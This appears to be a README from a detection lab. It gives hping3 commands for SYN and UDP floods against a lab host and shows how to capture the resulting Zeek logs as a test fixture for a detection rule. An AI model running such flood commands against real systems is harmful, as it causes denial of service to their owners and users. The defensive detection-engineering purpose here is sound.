# Attack reproduction — TCP SYN flood with hping3

`hping3` from the attacker host fires a SYN flood against a lab service.
Zeek records every probe; the detection in `../detection/` aggregates and
fires.

## Prereqs

- Attacker host on the lab subnet with `hping3`
- Target host on the lab bridge running any service
- Lab compose stack running

## Run (high level)

```bash
# Quick SYN flood — ~500 pps for 5 seconds
sudo hping3 -S -p 80 --flood -d 1 -c 2500 192.168.1.42

# UDP flood
sudo hping3 -2 -p 53 --flood -c 5000 192.168.1.42

# Stop with Ctrl+C
```

## Capture telemetry into a fixture

```bash
docker exec detlab-zeek cat /usr/local/zeek/logs/current/conn.log \
  | jq -c "select(.\"id.orig_h\" == \"<attacker_ip>\")" \
  > /tmp/flood_capture.log
head -300 /tmp/flood_capture.log > tests/positive_conn.log
```

## Safety / scope

- Lab use only.
- A real flood will saturate the lab bridge and may DoS the Splunk
  container in the same compose stack — keep the burst short.
- The synthetic `tests/positive_conn.log` shipped here is generated by
  `scripts/generate_fixtures.py` so the test suite is hermetic.
